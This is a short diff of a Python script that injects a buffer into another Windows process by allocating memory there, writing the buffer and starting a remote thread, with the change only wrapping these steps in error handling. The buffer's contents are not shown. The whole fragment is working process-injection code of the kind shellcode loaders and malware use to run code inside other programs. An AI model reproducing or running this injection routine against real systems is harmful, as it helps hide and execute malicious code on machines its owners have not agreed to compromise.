@@ -44,14 +44,13 @@ if __name__ == "__main__":
 
     with ProcessInjector(args.PROC, pid=args.pid) as ps_handle:
         bbuf_len = len(bbuf)
-        print("buf len -", bbuf_len)
-        #try:
-        base_addr = ps_handle.virtual_alloc_ex(bbuf_len)
-        print(f"Base Address @ {base_addr}")
-        print("[+] Writing data into allocated memory...")
-        ps_handle.write_process_memory(bbuf)
-        print("[+] Creating remote thread...")
-        print(ps_handle.create_remote_thread())
-        print("[+] Remote process memory injection Successful ...")
-        #except Exception as err:
-        #    print(err)
+        try:
+            base_addr = ps_handle.virtual_alloc_ex(bbuf_len)
+            print(f"Base Address @ {base_addr}")
+            print("[+] Writing data into allocated memory...")
+            ps_handle.write_process_memory(bbuf)
+            print("[+] Creating remote thread...")
+            print(ps_handle.create_remote_thread())
+            print("[+] Remote process memory injection Successful ...")
+        except Exception as err:
+            print(err)
